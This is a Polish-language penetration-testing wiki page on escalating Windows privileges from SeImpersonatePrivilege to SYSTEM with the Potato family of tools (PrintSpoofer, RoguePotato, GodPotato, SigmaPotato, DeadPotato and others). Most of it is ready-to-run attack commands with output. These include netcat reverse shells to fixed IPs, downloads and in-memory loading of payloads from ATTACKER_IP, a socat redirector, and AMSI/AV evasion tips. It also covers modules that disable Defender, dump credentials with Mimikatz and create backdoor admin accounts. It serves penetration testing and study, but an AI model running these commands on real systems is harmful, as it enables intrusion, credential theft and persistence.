# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato nie działa** w systemach Windows Server 2019 i Windows 10 w wersji 1809 lub nowszej. Można jednak użyć [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**,** aby **wykorzystać te same uprawnienia i uzyskać dostęp na poziomie `NT AUTHORITY\SYSTEM`**. Ten [wpis na blogu](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) szczegółowo omawia narzędzie `PrintSpoofer`, którego można użyć do nadużywania uprawnień do impersonacji na hostach Windows 10 i Server 2019, na których JuicyPotato już nie działa.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Nowoczesną alternatywą, często aktualizowaną w latach 2024–2025, jest SigmaPotato (fork GodPotato), który obsługuje użycie in-memory/reflection .NET i zapewnia rozszerzoną obsługę systemów operacyjnych. Poniżej znajdziesz przykładowe użycie oraz repozytorium w sekcji References.

Powiązane strony zawierające informacje wprowadzające i techniki manualne:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Wymagania i typowe problemy

Wszystkie poniższe techniki polegają na nadużywaniu uprzywilejowanej usługi obsługującej impersonację z kontekstu, w którym dostępne jest jedno z tych uprawnień:

- SeImpersonatePrivilege (najczęściej) lub SeAssignPrimaryTokenPrivilege
- Wysoki poziom integralności nie jest wymagany, jeśli token ma już SeImpersonatePrivilege (co jest typowe dla wielu kont usług, takich jak IIS AppPool, MSSQL itp.)

Szybkie sprawdzenie uprawnień:

```cmd
whoami /priv | findstr /i impersonate
```

Uwagi operacyjne:

- Jeśli shell działa z ograniczonym tokenem bez SeImpersonatePrivilege (częste w przypadku Local Service/Network Service w niektórych kontekstach), przywróć domyślne uprawnienia konta za pomocą FullPowers, a następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Token procesu może mieć mniej uprawnień niż inny token tego samego konta usługi lub sesji logowania. W niektórych konfiguracjach klient named pipe w tej samej sesji może udostępnić inny token z SeImpersonatePrivilege, ale skonfigurowane dla usługi `RequiredPrivileges` i wynik `whoami /priv` opisują różne rzeczy i nie dowodzą, że taki token jest dostępny. Przed rozważeniem ścieżki impersonacji zweryfikuj rzeczywisty token.
- PrintSpoofer wymaga uruchomionej usługi Print Spooler, dostępnej przez lokalny endpoint RPC (spoolss). W utwardzonych środowiskach, w których Spooler wyłączono po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga dostępnego przez TCP/135 resolvera OXID. Jeśli ruch wychodzący jest blokowany, użyj redirectora/port-forwardera (zobacz przykład poniżej). Sprawdź flagi obsługiwane przez używaną kompilację.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, wypróbuj alternatywne pipe’y (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zazwyczaj wskazuje na nieznaną lub nieobsługiwaną usługę uwierzytelniania RPC; wypróbuj inny pipe/transport lub upewnij się, że usługa docelowa działa.
- „Kitchen-sinkowe” forki, takie jak DeadPotato, zawierają dodatkowe moduły payloadów (Mimikatz/SharpHound/Defender off), które zapisują dane na dysku; spodziewaj się większej wykrywalności przez EDR niż w przypadku oryginalnych, odchudzonych wersji.

## Szybkie demo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Uwagi:
- Możesz użyć `-i`, aby uruchomić interaktywny proces w bieżącej konsoli, lub `-c`, aby wykonać jednolinijkowe polecenie.
- Wymagana jest usługa Spooler. Jeśli jest wyłączona, ta metoda nie zadziała.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

W [użyciu upstream](https://github.com/antonioCoco/RoguePotato#usage) `-e` podaje polecenie, `-l` wybiera lokalny port resolvera, a opcjonalne `-c` wybiera CLSID. Jeśli aktywacja COM uruchamia usługę, której ścieżka do pliku wykonywalnego została wcześniej zmodyfikowana, usługa może wykonać zmienione polecenie niezależnie od impersonacji tokena; przed przypisaniem zaobserwowanego wykonania z uprawnieniami SYSTEM tej technice sprawdź konfigurację usługi.

Jeśli wychodzący ruch na porcie 135 jest blokowany, przekieruj resolver OXID przez socat na redirectorze:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato to nowszy mechanizm nadużycia COM, opublikowany pod koniec 2022 roku, który atakuje usługę **PrintNotify** zamiast Spooler/BITS. Plik binarny tworzy instancję serwera COM PrintNotify, podmienia `IUnknown` na fałszywy obiekt, a następnie wywołuje uprzywilejowany callback za pomocą `CreatePointerMoniker`. Gdy usługa PrintNotify (działająca jako **SYSTEM**) nawiązuje połączenie zwrotne, proces duplikuje zwrócony token i uruchamia podany payload z pełnymi uprawnieniami.<sup>[[13]](#references)</sup>

Najważniejsze informacje operacyjne:

* Działa w systemach Windows 10/11 i Windows Server 2012–2022, o ile zainstalowana jest usługa Print Workflow/PrintNotify (jest dostępna nawet wtedy, gdy starsza usługa Spooler jest wyłączona po PrintNightmare).
* Wymaga, aby kontekst wywołujący miał uprawnienie **SeImpersonatePrivilege** (typowe dla IIS APPPOOL, MSSQL i kont usług zadań zaplanowanych).
* Przyjmuje bezpośrednie polecenie albo tryb interaktywny, dzięki czemu można pozostać w oryginalnej konsoli. Przykład:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Ponieważ działa wyłącznie w oparciu o COM, nie wymaga nasłuchiwania na named pipe ani zewnętrznych przekierowań, dzięki czemu może zastąpić RoguePotato na hostach, na których Defender blokuje jego wiązanie RPC.

Operatorzy tacy jak Ink Dragon uruchamiają PrintNotifyPotato natychmiast po uzyskaniu RCE przez ViewState w SharePoint, aby przejść z procesu roboczego `w3wp.exe` do SYSTEM przed zainstalowaniem ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Wskazówka: Jeśli jeden potok zawiedzie lub EDR go zablokuje, wypróbuj inne obsługiwane potoki:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Uwagi:
- Działa w systemach Windows 8/8.1–11 i Server 2012–2022, jeśli dostępne jest SeImpersonatePrivilege.
- Pobierz plik binarny zgodny z zainstalowanym środowiskiem uruchomieniowym (np. `GodPotato-NET4.exe` w nowoczesnym Server 2022).
- Jeśli początkowy mechanizm wykonania to webshell/UI z krótkimi limitami czasu, umieść payload w skrypcie i poproś GodPotato o jego uruchomienie zamiast używać długiego polecenia wpisanego bezpośrednio.<sup>[[12]](#references)</sup>

Szybki sposób na umieszczenie pliku w zapisywalnym katalogu głównym IIS:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwa warianty atakujące obiekty DCOM usług, które domyślnie używają RPC_C_IMP_LEVEL_IMPERSONATE. Zbuduj pliki binarne lub użyj udostępnionych i uruchom polecenie:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (zaktualizowany fork GodPotato)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak wykonywanie w pamięci za pomocą refleksji .NET oraz helper do reverse shell w PowerShell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Dodatkowe zalety w wersjach z lat 2024–2025 (v1.2.x):
- Wbudowana flaga reverse shell `--revshell` i usunięcie limitu 1024 znaków w PowerShellu, dzięki czemu można jednorazowo uruchomić długie payloady omijające AMSI.
- Składnia przyjazna dla Reflection (`[SigmaPotato]::Main()`), a także podstawowa sztuczka omijająca AV, wykorzystująca `VirtualAllocExNuma()` do zmylenia prostych heurystyk.
- Osobny plik `SigmaPotatoCore.exe`, skompilowany z użyciem .NET 2.0, przeznaczony dla środowisk PowerShell Core.

### DeadPotato (przeróbka GodPotato z 2024 roku z modułami)

DeadPotato zachowuje łańcuch podszywania się OXID/DCOM z GodPotato, ale zawiera pomocnicze narzędzia post-exploitation, dzięki czemu operatorzy mogą od razu uzyskać uprawnienia SYSTEM i przeprowadzić persistence/zbieranie danych bez dodatkowych narzędzi.<sup>[[15]](#references)</sup>

Typowe moduły (wszystkie wymagają SeImpersonatePrivilege):

- `-cmd "<cmd>"` — uruchomienie dowolnego polecenia jako SYSTEM.
- `-rev <ip:port>` — szybki reverse shell.
- `-newadmin user:pass` — utworzenie lokalnego administratora na potrzeby persistence.
- `-mimi sam|lsa|all` — zapisanie na dysku i uruchomienie Mimikatz w celu zrzucenia poświadczeń (pozostawia ślady na dysku i jest głośne).
- `-sharphound` — uruchomienie zbierania danych przez SharpHound jako SYSTEM.
- `-defender off` — wyłączenie ochrony Defendera w czasie rzeczywistym (bardzo głośne).

Przykładowe jednolinijkowe polecenia:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Ponieważ zawiera dodatkowe pliki binarne, spodziewaj się większej liczby alertów AV/EDR; gdy liczy się stealth, użyj lżejszego GodPotato/SigmaPotato.

## References

- [1] [PrintSpoofer – Wykorzystywanie uprawnień do impersonacji w Windows 10 i Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Koniec z JuicyPotato? Stara historia, witaj RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Przywracanie domyślnych uprawnień tokenu kontom usług](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — wyciek NTLM z WMP → junction NTFS do katalogu webroot, prowadzący do RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — makro LibreOffice → webshell IIS → GodPotato do SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci relay i kulis skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – przeróbka GodPotato z wbudowanymi modułami post-ex](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
